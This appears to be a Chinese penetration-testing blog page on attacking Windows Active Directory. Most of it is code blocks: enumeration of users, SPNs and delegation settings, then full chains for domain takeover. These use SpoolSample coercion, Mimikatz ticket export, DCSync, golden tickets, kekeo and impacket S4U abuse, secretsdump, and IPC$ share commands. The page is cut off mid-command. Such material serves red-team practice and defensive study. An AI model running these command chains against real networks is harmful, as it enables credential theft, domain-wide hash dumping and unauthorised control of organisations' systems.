<p>这里只获取用户名和描述信息。这些信息都是管理员手动添加上去的，看描述方便定位有价值的用户。</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 所有用户的描述信息</span></span><br><span class="line"><span class="built_in">Get-NetUser</span> | <span class="built_in">Select</span> samaccountname, description</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定用户的描述信息</span></span><br><span class="line"><span class="built_in">Get-NetUser</span> <span class="literal">-Identity</span> &lt;username&gt; | <span class="built_in">Select</span> samaccountname, description</span><br></pre></td></tr></table></figure>

<h4 id="用户预认证"><a href="#用户预认证" class="headerlink" title="用户预认证"></a>用户预认证</h4><blockquote>
<p>涉及 Kerberos Authentication 内容，默认创建用户不会开启“禁用预认证”选项。</p>
</blockquote>
<h4 id="SPN"><a href="#SPN" class="headerlink" title="SPN"></a>SPN</h4><blockquote>
<p>查询启用了 SPN 的用户名，开启后可以使用 Kerberoasting 攻击，得到 krb5tgs，离线破解。</p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询开启了SPN的用户</span></span><br><span class="line">Get-NetUser -SPN | <span class="keyword">Select</span> samaccountname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询指定域开启了SPN的用户</span></span><br><span class="line"><span class="keyword">Get</span>-NetUser -SPN -<span class="keyword">domain</span> &lt;<span class="keyword">Domain</span> <span class="keyword">Name</span>&gt;| <span class="keyword">Select</span> samaccountname</span><br></pre></td></tr></table></figure>

<blockquote>
<p>不使用PoweView，使用Windows自带的setspn查询SPN也可以</p>
<p>主要关注 CN=Users，一般来说是只发现 krbtgt 用户设置了 SPN</p>
<p>只有域用户(Users)的密码有用，机器账户的密码不能远程登录</p>
</blockquote>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 查询当前域所有SPN</span></span><br><span class="line">setspn -Q <span class="emphasis">*/*</span></span><br><span class="line"></span><br><span class="line"><span class="section"># 查询指定域的所有SPN</span></span><br><span class="line">setspn -T <span class="xml"><span class="tag">&lt;<span class="name">Domain</span> <span class="attr">Name</span>&gt;</span></span> -Q <span class="emphasis">*/*</span></span><br></pre></td></tr></table></figure>



<h3 id="组信息"><a href="#组信息" class="headerlink" title="组信息"></a>组信息</h3><blockquote>
<p>组描述信息</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前域所有组的详细信息</span><br><span class="line"><span class="keyword">Get</span>-NetGroup</span><br><span class="line"><span class="keyword">Get</span>-DomainGroup</span><br><span class="line"></span><br><span class="line"># 查询指定域内所有组详细信息</span><br><span class="line"><span class="keyword">Get</span>-NetGroup -<span class="keyword">domain</span> &lt;<span class="keyword">domain</span> <span class="type">name</span>&gt;</span><br><span class="line"></span><br><span class="line"># 查看指定组详细信息</span><br><span class="line"><span class="keyword">Get</span>-NetGroup -<span class="keyword">Identity</span> &lt;<span class="keyword">Group</span> <span class="type">Name</span>&gt;</span><br><span class="line"><span class="keyword">Get</span>-DomainGroup -<span class="keyword">Identity</span> &lt;<span class="keyword">Group</span> <span class="type">Name</span>&gt;</span><br><span class="line"></span><br><span class="line"># 查看所有组描述信息，关注有没有管理员自创组</span><br><span class="line"><span class="keyword">Get</span>-NetGroup | <span class="keyword">Select</span> samaccountname, description</span><br></pre></td></tr></table></figure>

<blockquote>
<p>组成员信息</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前域内指定组有哪些成员</span><br><span class="line"><span class="keyword">Get</span>-NetGroupMember -<span class="keyword">Identity</span> &lt;<span class="keyword">Group</span> <span class="type">Name</span>&gt; -Recurse</span><br><span class="line"><span class="keyword">Get</span>-DomainGroupMember -<span class="keyword">Identity</span> &lt;<span class="keyword">Group</span> <span class="type">Name</span>&gt; -Recurse</span><br><span class="line"></span><br><span class="line"># 查询指定域指定组的成员</span><br><span class="line"><span class="keyword">Get</span>-NetGroupMember -<span class="keyword">Domain</span> &lt;<span class="keyword">Domain</span> <span class="type">Name</span>&gt; -<span class="keyword">Identity</span> &lt;<span class="keyword">group</span> <span class="type">name</span>&gt; -Recurse</span><br><span class="line"></span><br><span class="line"># 获取当前域内指定组成员信息，包含域名、组名、组成员名、组成员类型</span><br><span class="line"><span class="keyword">Get</span>-NetGroupMember -<span class="keyword">Identity</span> &lt;<span class="keyword">group</span> <span class="type">name</span>&gt; -Recurse | <span class="keyword">Select</span> groupdomain, groupname, membername, memberobjectclass</span><br></pre></td></tr></table></figure>

<h3 id="组织单元"><a href="#组织单元" class="headerlink" title="组织单元"></a>组织单元</h3><blockquote>
<p>所属哪个组织单元，类似那个部门</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 查询当前域有哪些 OU，并展示所有 OU 详细信息</span><br><span class="line"><span class="keyword">Get</span>-DomainOU</span><br><span class="line"></span><br><span class="line"># 查询OU名称</span><br><span class="line"><span class="keyword">Get</span>-DomainOU -Properties <span class="type">Name</span></span><br><span class="line"></span><br><span class="line"># 查询指定OU详细</span><br><span class="line"><span class="keyword">Get</span>-DomainOU -<span class="keyword">Identity</span> &lt;OU <span class="type">Name</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Kerberos委派"><a href="#Kerberos委派" class="headerlink" title="Kerberos委派"></a>Kerberos委派</h3><blockquote>
<p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户的权限在域内展开活动</p>
<p>发现域中委派的用户或计算机一般视同<code>LDAP</code>协议，通过筛选<code>userAccountControl</code>属性来找出符合的用户或计算机</p>
<p>非约束委派、约束委派、基于资源的约束委派</p>
</blockquote>
<h4 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h4><blockquote>
<p>当服务账号或者主机被设置为非约束性委派时，其<code>userAccountControl</code>属性会包含<code>TRUSTED_FOR_DELEGATION</code> <em>域控主机账户默认开启非约束委派</em></p>
<p><strong>非约束性委派是不会限制当前服务器被委派时可访问的服务的</strong></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">PowerView</a></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找当前域那台计算机被设置为非约束委派</span></span><br><span class="line">Get-NetComputer -Unconstrained | <span class="keyword">select</span> dnshostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找指定域那台计算机被设置为非约束委派</span></span><br><span class="line"><span class="keyword">Get</span>-NetComputer -Unconstrained -<span class="keyword">Domain</span> &lt;DomainName&gt; | <span class="keyword">select</span> dnshostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域内非约束委派用户</span></span><br><span class="line"><span class="keyword">Get</span>-NetUser -Unconstrained -<span class="keyword">Domain</span> &lt;DomainName&gt; |<span class="keyword">select</span> <span class="keyword">name</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.joeware.net/freetools/tools/adfind/">Adfind</a></p>
</blockquote>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询非约束委派的主机</span></span><br><span class="line">AdFind.exe -<span class="keyword">b </span><span class="string">&quot;DC=&lt;DomainName&gt;,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn <span class="keyword">distinguishedName</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line"><span class="keyword"># </span>查询费约束委派的用户</span><br><span class="line">AdFind.exe -<span class="keyword">b </span><span class="string">&quot;DC=&lt;DomainName&gt;,DC=com&quot;</span> -f <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> cn <span class="keyword">distinguishedName</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>ldapsearch(Kali自带)</p>
<p>区别服务用户和主机的区别是<code>samAccountType=805306368 (0x30000000)</code>时为用户，<code>samAccountType=805306369 (0x30000001)</code>时为主机</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询域中非约束委派的主机</span></span><br><span class="line">ldapsearch -x -H ldap:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">141.145</span>:<span class="number">389</span> -D <span class="string">&quot;CN=qiyou,CN=Users,DC=qiyou,DC=com&quot;</span> -w password -b <span class="string">&quot;DC=qiyou,DC=com&quot;</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> |grep -iE <span class="string">&quot;distinguishedName&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域中非约束委派的用户</span></span><br><span class="line">ldapsearch -x -H ldap:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">141.145</span>:<span class="number">389</span> -D <span class="string">&quot;CN=qiyou,CN=Users,DC=qiyou,DC=com&quot;</span> -w password -b <span class="string">&quot;DC=qiyou,DC=com&quot;</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> |grep -iE <span class="string">&quot;distinguishedName&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>非约束委派利用</p>
</blockquote>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正常的非约束委派利用需要域用户连接到类似MSSQL、<span class="keyword">IIS</span>、WinRM等服务上，让域管的TGT缓存到服务机器上，然后用Mimikat导出来注入到当前会话中，但是需要管理员主动连接才能获取到TGT利用。</span><br></pre></td></tr></table></figure>

<blockquote>
<p>非约束委派+Spooler打印机服务</p>
<p>利用打印系统远程协议，强制任何运行了Spooler服务的计算机通过<code>Kerberos</code>或<code>NTLM</code>对攻击者选择的目标进行身份验证。</p>
</blockquote>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用前提：</span><br><span class="line">    需要获取一台主机账户开启了非约束委派域内机器的权限(主机账号，而不是服务用户)</span><br><span class="line">    注：<span class="builtin-name">Print</span> Spooler服务默认是自动运行的</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向DM2012域控的Spooler服务发送请求，强制其访问win10进行身份验证</span></span><br><span class="line">SpoolSample.exe dm2012 win10</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用Rubeus每隔一秒来监听Event ID为4624来自dm2012的登录(管理员权限)</span></span><br><span class="line">Rubeus.exe monitor <span class="regexp">/interval:1 /</span>filteruser:dm2012$</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当获取到以后使用Mimikatz导出TGT</span></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到TGT之后，我们用ptt将票据注入到当前会话后，可以用dcsync导出域控中所有用户的hash，然后用krbtgt用户的hash生成黄金票据</span></span><br><span class="line">kerberos::ptt [<span class="number">0</span>;<span class="number">862</span>bdd]-<span class="number">2</span>-<span class="number">0</span>-<span class="number">60</span>a10000-DM2012<span class="variable">$@krbtgt</span>-TEST.LOCAL.kirbi</span><br><span class="line">lsadump::dcsync <span class="regexp">/domain:test.local /</span>all /csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到krbtgt用户的hash之后就可以生成administrator的黄金票据</span></span><br><span class="line">kerberos::golden <span class="regexp">/user:Administrator /</span>domain:&lt;DomainName&gt; <span class="regexp">/sid:S-1-5-21-662417213-3583657854-423750704 /</span>krbtgt:<span class="number">683545</span>df56ea57b168d0ad090e209616 /ptt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用klist查看本地缓存的票据</span></span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后就可以使用WinRM付服务来远程域控dm2012</span></span><br><span class="line">Enter-PSSession -ComputerName dm2012</span><br></pre></td></tr></table></figure>



<h4 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h4><blockquote>
<p>当服务账号或者主机被设置为约束性委派时，其<code>userAccountControl</code>属性包含<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，且<code>msDS-AllowedToDelegateTo</code>属性会包含被约束的服务</p>
<p><strong>约束委派就是限制了当前服务器可以被委派去访问哪些服务</strong></p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1">PowerView</a></p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找当前域那台计算机被设置为约束委派</span></span><br><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-TrustedToAuth</span> <span class="literal">-Domain</span> nncm.com <span class="literal">-Properties</span> distinguishedname,useraccountcontrol,msds<span class="literal">-allowedtodelegateto</span>|<span class="built_in">ft</span> <span class="literal">-Wrap</span> <span class="literal">-AutoSize</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域内约束委派用户</span></span><br><span class="line"><span class="built_in">Get-DomainUser</span> –TrustedToAuth <span class="literal">-domain</span> nncm.com <span class="literal">-Properties</span> distinguishedname,useraccountcontrol,msds<span class="literal">-allowedtodelegateto</span>|<span class="built_in">fl</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.joeware.net/freetools/tools/adfind/">Adfind</a></p>
</blockquote>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 查询非约束委派的主机</span><br><span class="line">AdFind.<span class="keyword">exe</span> -<span class="keyword">b</span> <span class="string">&quot;DC=networksec,DC=loacl&quot;</span> -<span class="keyword">f</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(msds- allowedtodelegateto=*))&quot;</span> <span class="keyword">cn</span> distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># 查询约束委派的用户</span><br><span class="line">AdFind.<span class="keyword">exe</span> -<span class="keyword">b</span> <span class="string">&quot;DC=networksec,DC=loacl&quot;</span> -<span class="keyword">f</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot;</span> <span class="keyword">cn</span> distinguishedName msds-allowedtodelegateto</span><br><span class="line"></span><br><span class="line"># 指定账户密码</span><br><span class="line">adfind.<span class="keyword">exe</span> -h <span class="number">10.0</span>.<span class="number">10.110</span> -<span class="keyword">u</span> vulntarget\win2016 -<span class="keyword">up</span> Admin#<span class="number">123</span> -<span class="keyword">b</span> <span class="string">&quot;DC=vulntarget,DC=com&quot;</span> -<span class="keyword">f</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> <span class="keyword">cn</span> distinguishedName</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ldapsearch(Kali自带)</p>
<p>区别服务用户和主机的区别是<code>samAccountType=805306368 (0x30000000)</code>时为用户，<code>samAccountType=805306369 (0x30000001)</code>时为主机</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查询域中非约束委派的主机</span></span><br><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://<span class="number">172.16.25.242:389</span> -D <span class="string">&quot;CN=user0x2,CN=Users,DC=networksec,DC=loacl&quot;</span> -w q<span class="number">123456</span>. -b <span class="string">&quot;DC=networksec,DC=loacl&quot;</span> <span class="string">&quot;(&amp;(samAccountType=805306369)(msds- allowedtodelegateto=*))&quot;</span> |grep -iE <span class="string">&quot;distinguishedName|allowedtodelegateto&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询域中非约束委派的用户</span></span><br><span class="line"><span class="attribute">ldapsearch</span> -x -H ldap://<span class="number">172.16.25.242:389</span> -D <span class="string">&quot;CN=user0x1,CN=Users,DC=networksec,DC=loacl&quot;</span> -w q<span class="number">123456</span>. -b <span class="string">&quot;DC=networksec,DC=loacl&quot;</span> <span class="string">&quot;(&amp;(samAccountType=805306368)(msds- allowedtodelegateto=*))&quot;</span> |grep -iE <span class="string">&quot;distinguishedName|allowedtodelegateto&quot;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>约束委派利用</p>
</blockquote>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在约束委派的情况下，服务用户只能获取某个用户或某个主机的服务<span class="keyword">ST</span>,所以只能模拟用户访问特定的服务，无法获取用户的TGT。</span><br><span class="line">但是如果能获取到开启了约束委派服务的服务用户的密码或者NTML Hash，就可以伪造成服务用户以任意账户的权限申请访问某服务的<span class="keyword">ST</span>。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>前提条件</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要获取一个约束委派的服务账户密码或NTLM HASH</span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo">kekeo</a></p>
<p>知道服务用户的明文情况</p>
</blockquote>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 利用kekeo导出该服务用户的TGT</span></span><br><span class="line"><span class="symbol">tgt:</span>:ask /user:<span class="params">&lt;UserName&gt;</span> /domain:<span class="params">&lt;DomainName&gt;</span> /password:<span class="params">&lt;PassWord&gt;</span> /ticket:test.kirbi</span><br><span class="line"></span><br><span class="line"><span class="meta"># 利用kekeo使用这张TGT伪造s4u请求以Administrator的身份访问dm08的CIFS的ST</span></span><br><span class="line"><span class="symbol">tgs:</span>:s4u /tgt:<span class="params">&lt;TGT文件名&gt;</span>.kirbi /user:Administrator@<span class="params">&lt;Domain Name&gt;</span> /service:cifs/dm08.<span class="params">&lt;Domain Name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 获取到的dm08 CIFS服务的ST2会保存在当前目录下然后使用Mimikatz将ST2导入当前会话</span></span><br><span class="line"><span class="symbol">kerberos:</span>:ptt <span class="params">&lt;ST2文件名&gt;</span>.kirbi</span><br><span class="line"></span><br><span class="line"><span class="meta"># 可以成功访问到dm08的CIFS服务</span></span><br><span class="line">dir \\dm08.Domain.com\c$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>知道NTML HASH的情况</p>
</blockquote>
<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># 导出该服务用户的TGT</span></span><br><span class="line"><span class="symbol">tgt:</span>:ask /user:<span class="params">&lt;UserName&gt;</span> /domain:<span class="params">&lt;Domain Name&gt;</span> /NTLM:<span class="params">&lt;NtmlHash&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 利用kekeo使用这张TGT伪造s4u请求以Administrator的身份访问dm08的CIFS的ST</span></span><br><span class="line"><span class="symbol">tgs:</span>:s4u /tgt:<span class="params">&lt;TGT文件名&gt;</span>.kirbi /user:Administrator@<span class="params">&lt;Domain Name&gt;</span>/service:cifs/dm08.<span class="params">&lt;Domain Name&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># 获取到的dm08 CIFS服务的ST2会保存在当前目录下然后使用Mimikatz将ST2导入当前会话</span></span><br><span class="line"><span class="symbol">kerberos:</span>:ptt <span class="params">&lt;ST2文件名&gt;</span>.kirbi</span><br><span class="line"></span><br><span class="line"><span class="meta"># 可以成功访问到dm08的CIFS服务</span></span><br><span class="line">dir \\dm08.Domain.com\c$</span><br></pre></td></tr></table></figure>

<blockquote>
<p>利用约束委派生生成黄金票据</p>
</blockquote>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TGT的生成是由krbtgt用户加密和签名的，如果我们能委派域上的用户去访问TGS，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用krbtgt的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</span><br><span class="line">注:TGS默认的spn是krbtgt/<span class="keyword">domain</span> <span class="type">name</span>,krrbtgt 默认是禁用的</span><br></pre></td></tr></table></figure>

<figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># AD是自带ActiveDirectory的，没有的话需要自己导入：import-module .\Microsoft.ActiveDirectory.Management.dll</span></span><br><span class="line">Import-Module ActiveDirectory</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = Get-ADUser <span class="variable">&lt;服务用户名&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加SPN</span></span><br><span class="line">Set-ADObject <span class="variable">$user</span> -Add @&#123; <span class="string">&quot;msDS-AllowedToDelegateTo&quot;</span> = @(<span class="string">&quot;krbtgt/&lt;Domain Name&gt;&quot;</span>) &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用impacket软件的getST向KDC请求administrator的TGT</span></span><br><span class="line"><span class="comment"># 会生成一个Administrator.ccache的缓存文件</span></span><br><span class="line">getST.py -dc-ip <span class="variable">&lt;Domain IP&gt;</span> -spn krbtgt/<span class="variable">&lt;Doamin Name&gt;</span> -impersonate Administrator <span class="variable">&lt;Doamin name&gt;</span>/<span class="variable">&lt;DomainUser&gt;</span>:<span class="variable">&lt;Password&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用mimikatz进行ptc（pass the cache），将缓存注入当前会话中</span></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptc Administrator.ccache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用klist查看当前缓存的票据</span></span><br><span class="line">klist</span><br><span class="line"></span><br><span class="line"><span class="comment"># 就可以直接访问域控了</span></span><br><span class="line">dir \\<span class="variable">&lt;Doamin HostName&gt;</span>\c$</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行命令可以使用powershell或者impoacket系列</span></span><br><span class="line"><span class="built_in">set</span> KRB5CCNAME=Administrator.ccache</span><br><span class="line">wmiexec.exe -no-pass -k administrator@WIN-QFPHJSM1L7G.qiyou.com -dc-ip <span class="number">192.168</span>.<span class="number">141.145</span></span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取直接导出域控上所有用户以及主机的hash</span></span><br><span class="line"><span class="built_in">set</span> KRB5CCNAME=Administrator.ccache</span><br><span class="line">secretsdump.exe -no-pass -k WIN-QFPHJSM1L7G.qiyou.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="资源约束委派"><a href="#资源约束委派" class="headerlink" title="资源约束委派"></a>资源约束委派</h4><blockquote>
<p>传统的约束委派中仍然存在一些缺点，如无法进行跨域委派。</p>
<p>基于资源的约束委派只能在运行Windows Server 2012 R2和Windows Server 2012的域控制器上配置，但可以在混合模式林中应用</p>
<p>与约束委派最大的不同点，在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p>
</blockquote>
<blockquote>
<p>域账户 join 将办公机加入域，我们又知道 join 账户凭证，那么就可以拿下使用 join 账户加入域的所有机器权限。</p>
</blockquote>
<h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><h3 id="网络共享"><a href="#网络共享" class="headerlink" title="网络共享"></a>网络共享</h3><blockquote>
<p>前提条件</p>
</blockquote>
<ul>
<li>远程主机开启了IPC连接</li>
<li>远程主机的139、445端口开放</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># 查看Windows默认开启的共享</span><br><span class="line"><span class="built_in">net</span> share</span><br><span class="line">C$     #C盘共享</span><br><span class="line">ADMIN$ #系统目录共享</span><br><span class="line">IPC$   # IP$共享</span><br><span class="line"></span><br><span class="line"># IPC$ 连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\ipc$          # 建立空连接</span><br><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">131</span>\ipc$ &quot;password&quot; /user:&quot;Administrator&quot;   # 建立非空连接</span><br><span class="line"></span><br><span class="line"># IPC$ 使用</span><br><span class="line"><span class="built_in">net</span> use                               # 查看本机连接其他机器</span><br><span class="line"><span class="built_in">net</span> session                           # 查看其他机器连接本机，需要administrator执行</span><br><span class="line"><span class="built_in">net</span> share                             # 查看本地开启的共享</span><br><span class="line"><span class="built_in">net</span> share ipc$                        # 开启ipc$共享</span><br><span class="line"><span class="built_in">net</span> share ipc$ /<span class="built_in">del</span>                   # 删除ipc$共享</span><br><span class="line"><span class="built_in">net</span> share admin$ /<span 